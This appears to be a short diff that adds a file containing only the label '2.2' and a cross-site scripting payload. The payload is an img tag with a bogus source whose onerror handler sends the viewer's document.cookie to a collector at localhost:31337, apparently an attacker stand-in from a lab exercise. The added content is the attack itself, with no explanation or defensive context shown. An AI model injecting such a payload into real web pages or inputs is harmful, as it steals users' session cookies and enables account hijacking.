@@ -1,0 +1,6 @@
+
+
+
+2.2
+<img src=ewdsd onerror=document.location='http://localhost:31337/stolen?cookies='+document.cookie;>
+
